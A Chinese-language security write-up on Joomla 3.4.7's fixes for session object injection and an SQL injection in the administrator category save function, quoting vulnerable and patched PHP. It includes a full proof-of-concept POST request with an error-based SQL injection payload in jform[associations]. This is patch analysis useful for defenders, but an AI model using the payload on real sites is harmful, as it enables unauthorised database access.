> 原文链接: https://www.anquanke.com//post/id/83177 


# Joomla 3.4.7 修复的反序列化与SQL注入


                                阅读量   
                                **138640**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0195e2dacea7fca0b3.png)](https://p2.ssl.qhimg.com/t0195e2dacea7fca0b3.png)

**       作者： Mars@0kee Team**

       Joomla! 官方12月21号发布了3.4.7 新版程序，其中修复了Session序列化和一处SQL注入。

## 

## 反序列化漏洞修复分析

       前一阵子 Joomla 的对象注入很火，而官方 3.4.6 的修复仅仅是严格过滤了 X_FORWARDED_FOR 和注释了 USER_AGENT 存入 SESSION 那一句，见：[https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021](https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021)，这样只是指哪补哪，治标不治本。看来官方上次的修复只是临时解决方案，这次的更新(3.4.7)算是彻底解决了此问题。

 

       上次的对象注入，需要满足三个条件：

              1. 自己实现session的处理方式，重新实现了 session 存储的read()和write()方法，但是并没有对 session 的值进行安全处理。

              2. Mysql非strict mode下，使用utf8mb4字符 xF0x9Dx8Cx86 来截断。

              3. PHP &lt;= 5.6.13 session中反序列化解析的BUG。

       (详情请看P牛文章：[http://drops.wooyun.org/papers/11330](http://drops.wooyun.org/papers/11330) )

       Joomla 官方也只能解决第一个，也就是改进session的处理方式。这次更新，在 libraries/cms/version/version.php 中，将SESSION存储在内部的Registry类对象中，弃用了以前使用 $_SESSION[$namespace][$name] 的方式：

```
$this-&gt;data = new JoomlaRegistryRegistry;
```



       并且，在写SESSION的时候会先做base64_encode，

```
public function close()`{`
    if ($this-&gt;_state !== 'active')`{`
        // @TODO :: generated error here
        return false;
    `}`
    $session = JFactory::getSession();
    $data    = $session-&gt;getData();
 
    // Before storing it, let's serialize and encode the JRegistry object
    $_SESSION['joomla'] = base64_encode(serialize($data));
 
    session_write_close();
    return true;
`}`
```



       这样，$_SESSION就只剩下了$_SESSION['joomla']，而且$_SESSION['joomla'] 只存储了Registry的对象$data，在执行read()和write()时候，SESSION是经过base64_encode后的数据，就不会存在read()之后自动反序列化而导致对象注入了。

在反序列化的时候也不存在unserialize参数可控的情况。（可控的只是$data的成员变量）

<br>

```
if (isset($_SESSION['joomla']) &amp;&amp; !empty($_SESSION['joomla']))`{`
    $data = $_SESSION['joomla'];
    $data = base64_decode($data);
    $this-&gt;data = unserialize($data);
`}`
```



       Joomla官方这次的解决方案比较好，不像上次那样治标不治本，这样的态度值得称赞。反观Apache对struts2 漏洞的修复…就不说了。



## 

## SQL注入

###        一、漏洞分析

       <br>

       代码位于，administrator/components/com_categories/models/category.php，save()函数内：

<br>

```
$assoc = $this-&gt;getAssoc();
 
if ($assoc)
`{`
    // Adding self to the association
    $associations = $data['associations'];
 
    foreach ($associations as $tag =&gt; $id)
    `{`
        if (empty($id))
        `{`
            unset($associations[$tag]);
        `}`
    `}`
 
    // Detecting all item menus
    $all_language = $table-&gt;language == '*';
 
    if ($all_language &amp;&amp; !empty($associations))
    `{`
        JError::raiseNotice(403, JText::_('COM_CATEGORIES_ERROR_ALL_LANGUAGE_ASS
        OCIATED'));
    `}`
 
    $associations[$table-&gt;language] = $table-&gt;id;
 
    // Deleting old association for these items
    $db = $this-&gt;getDbo();
    $query = $db-&gt;getQuery(true)
        -&gt;delete('#__associations')
        -&gt;where($db-&gt;quoteName('context') . ' = ' . $db-&gt;quote($this-&gt;associatio
        nsContext))
        -&gt;where($db-&gt;quoteName('id') . ' IN (' . implode(',', $associations) . '
        )');
    $db-&gt;setQuery($query);
    $db-&gt;execute();
 
    if ($error = $db-&gt;getErrorMsg())
    `{`
        $this-&gt;setError($error);
 
        return false;
    `}`
 
    if (!$all_language &amp;&amp; count($associations))
    `{`
        // Adding new association for these items
        $key = md5(json_encode($associations));
        $query-&gt;clear()
            -&gt;insert('#__associations');
 
        foreach ($associations as $id)
        `{`
            $query-&gt;values($id . ',' . $db-&gt;quote($this-&gt;associationsContext) . 
            ',' . $db-&gt;quote($key));
        `}`
 
        $db-&gt;setQuery($query);
        $db-&gt;execute();
 
        if ($error = $db-&gt;getErrorMsg())
        `{`
            $this-&gt;setError($error);
 
            return false;
        `}`
    `}`
`}`
```



       其中的 $associations 未经过适当处理、我们跟着流程来看看。

<br>

       首先，$assoc = $this-&gt;getAssoc(); 为 True 的时候整个逻辑才能进来，这个getAssoc()是什么呢？跟进getAssoc()的实现(文件的 1234 行)，发现关键是在：

```
$assoc = JLanguageAssociations::isEnabled();
```



       搜索一下，发现 JLanguageAssociations 是 Joomla 的一个多语言插件[http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler](http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler) , 这个插件是 Joomla 自带的，默认没有开启，我们在后台将他开启。



[![](https://p2.ssl.qhimg.com/t01fb4cf93b3adcc816.png)](https://p2.ssl.qhimg.com/t01fb4cf93b3adcc816.png)       <br>

        然后，继续看代码，$associations = $data['associations'];， $data是post过来的数据，associations没有经过过滤就传到了SQL语句中：

<br>

```
$query = $db-&gt;getQuery(true)
                -&gt;delete('#__associations')
                -&gt;where($db-&gt;quoteName('context') . ' = ' . $db-&gt;quote($this-&gt;as
                sociationsContext))
                -&gt;where($db-&gt;quoteName('id') . ' IN (' . implode(',', $associati
                ons) . ')');
```



导致SQL注入。

<br>

       那 Joomla 有没有全局过滤呢？我们看看 Joomla 是如何处理POST数据的。

<br>

       在 libraries/legacy/controller/form.php , save() 函数，

<br>

```
public function save($key = null, $urlVar = null)`{`
    ...
    $data  = $this-&gt;input-&gt;post-&gt;get('jform', array(), 'array');
    ...
    $validData = $model-&gt;validate($form, $data);
```



validate() 函数在 libraries/legacy/model/form.php 302行, 他又调用了libraries/joomla/form/form.php 的filter() 函数，具体实现就不继续了，总之这里的POST参数只是处理了 ' XSS and specified bad code. '。



       最后，构造POC。在修改分类，保存的时候，修改POST数据:

<br>

```
POST /Joomla/administrator/index.php?option=com_categories&amp;extension=com_content
&amp;layout=edit&amp;id=19
 
jform[title]=Joomla!&amp;jform[alias]=joomla&amp;jform[description]=&amp;jform[parent_id]=14
&amp;jform[published]=1&amp;jform[access]=1&amp;jform[language]=*&amp;jform[note]=&amp;jform[version
_note]=&amp;jform[created_time]=2011-01-01+00:00:01&amp;jform[created_user_id]=945&amp;jform
[modified_time]=2015-12-23+08:09:46&amp;jform[modified_user_id]=945&amp;jform[hits]=0&amp;jf
orm[id]=19&amp;jform[metadesc]=&amp;jform[metakey]=&amp;jform[metadata][author]=&amp;jform[metad
ata][robots]=&amp;jform[associations][en-GB]=2) or updatexml(1,concat(0x7e,(version(
))),0) -- -&amp;jform[rules][core.create][1]=&amp;jform[rules][core.delete][1]=&amp;jform[ru
les][core.edit][1]=&amp;jform[rules][core.edit.state][1]=&amp;jform[rules][core.edit.own
][1]=&amp;jform[rules][core.create][13]=&amp;jform[rules][core.delete][13]=&amp;jform[rules]
[core.edit][13]=&amp;jform[rules][core.edit.state][13]=&amp;jform[rules][core.edit.own][
13]=&amp;jform[rules][core.create][6]=&amp;jform[rules][core.delete][6]=&amp;jform[rules][co
re.edit][6]=&amp;jform[rules][core.edit.state][6]=&amp;jform[rules][core.edit.own][6]=&amp;j
form[rules][core.create][7]=&amp;jform[rules][core.delete][7]=&amp;jform[rules][core.edi
t][7]=&amp;jform[rules][core.edit.state][7]=&amp;jform[rules][core.edit.own][7]=&amp;jform[r
ules][core.create][2]=&amp;jform[rules][core.delete][2]=&amp;jform[rules][core.edit][2]=
&amp;jform[rules][core.edit.state][2]=&amp;jform[rules][core.edit.own][2]=&amp;jform[rules][
core.create][3]=&amp;jform[rules][core.delete][3]=&amp;jform[rules][core.edit][3]=&amp;jform
[rules][core.edit.state][3]=&amp;jform[rules][core.edit.own][3]=&amp;jform[rules][core.c
reate][4]=&amp;jform[rules][core.delete][4]=&amp;jform[rules][core.edit][4]=&amp;jform[rules
][core.edit.state][4]=&amp;jform[rules][core.edit.own][4]=&amp;jform[rules][core.create]
[5]=&amp;jform[rules][core.delete][5]=&amp;jform[rules][core.edit][5]=&amp;jform[rules][core
.edit.state][5]=&amp;jform[rules][core.edit.own][5]=&amp;jform[rules][core.create][10]=0
&amp;jform[rules][core.delete][10]=&amp;jform[rules][core.edit][10]=&amp;jform[rules][core.e
dit.state][10]=&amp;jform[rules][core.edit.own][10]=&amp;jform[rules][core.create][12]=0
&amp;jform[rules][core.delete][12]=&amp;jform[rules][core.edit][12]=&amp;jform[rules][core.e
dit.state][12]=&amp;jform[rules][core.edit.own][12]=&amp;jform[rules][core.create][8]=&amp;j
form[rules][core.delete][8]=&amp;jform[rules][core.edit][8]=&amp;jform[rules][core.edit.
state][8]=&amp;jform[rules][core.edit.own][8]=&amp;jform[params][category_layout]=&amp;jform
[params][image]=&amp;jform[params][image_alt]=&amp;jform[extension]=com_content&amp;task=cat
egory.apply&amp;2ebbc80d46dda42570c1b1699a58323d=1
```



成功注入。



[![](https://p1.ssl.qhimg.com/t01be4bd3c10da52194.png)](https://p1.ssl.qhimg.com/t01be4bd3c10da52194.png)



[![](https://p4.ssl.qhimg.com/t01028faeedf78dbdbe.png)](https://p4.ssl.qhimg.com/t01028faeedf78dbdbe.png)

  另外,libraries/legacy/model/admin.php 这里也存在着同样的问题。

<br>

###        二、修复方案

       <br>

       官方增加了

<br>

```
...
$associations = JoomlaUtilitiesArrayHelper::toInteger($associations);
...
$query-&gt;values(((int) $id) .',' .$db-&gt;quote($this-&gt;associationsContext) . ',' .$
db-&gt;quote($key));
...
```

       <br>

将$associations 中的所有值转换为int型。还有将 $id 强制转换为int。

 

<br>

参考：

http://drops.wooyun.org/papers/11330

http://drops.wooyun.org/papers/11371

http://bobao.360.cn/learning/detail/2501.html

[https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e](https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e)

https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html
